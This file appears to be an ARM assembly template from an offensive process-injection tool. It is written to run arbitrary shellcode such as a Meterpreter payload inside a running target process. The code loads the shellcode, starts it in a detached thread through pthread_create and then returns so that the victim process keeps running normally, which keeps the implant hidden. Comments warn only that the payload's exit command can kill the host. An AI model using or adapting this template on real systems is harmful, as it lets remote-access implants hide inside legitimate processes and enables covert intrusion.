# This code will launch the specified binary shellcode (e.g. Meterpreter)
# in a new, separate thread, then return to the original code
# so that the target process continues executing normally after injection
# However, it requires the offset for pthread_create in libpthread to do this
#
# WARNING: the binary shellcode can still cause the entire target process
# to exit. For example, with the default build options, Meterpreter will 
# happily execute in a separate thread, but if you execute the "exit" 
# command from the Meterpreter shell, it will kill the entire target process

[FRAGMENT:asminject_libpthread_pthread_create.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_detach.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_exit.s:FRAGMENT]
[FRAGMENT:asminject_nanosleep.s:FRAGMENT]

// load the arbitrary read/write address into r0
	ldr r0, [pc]
	b load_shellcode_address

read_write_address:
	.word [VARIABLE:READ_WRITE_ADDRESS:VARIABLE]
	.balign 4

call_pthread_create:
	push {r0}
	bl asminject_libpthread_pthread_create
	pop {r0}
// detach the newly-created thread where the shellcode is running
	bl asminject_libpthread_pthread_detach

[VARIABLE:POST_SHELLCODE_LABEL:VARIABLE]:

	b cleanup_and_return
	
// removed delimiter as workaround

load_shellcode_address:
// Add 0x1000 to avoid overwriting backed-up data
	add r0, r0, #0x1000
	mov r2, pc
	b call_pthread_create

//	stmdb sp!, {r11,lr}
//	add r11, sp, #0x04
//	sub sp, sp, #0x20
[VARIABLE:INLINE_SHELLCODE:VARIABLE]

// if the inline code returns, have it perform a pthread_exit to clean up
	mov r0, #0x0	@ pthread_exit return value NULL
	bl asminject_libpthread_pthread_exit
	
//	sub sp, r11, #0x04
//	ldmia sp!, {r11,pc}
	
//loop_forever:
//	mov r0, #0x10
//	mov r1, #0x10
//	bl asminject_nanosleep
//	b loop_forever

jump_back_from_shellcode:

b [VARIABLE:POST_SHELLCODE_LABEL:VARIABLE]
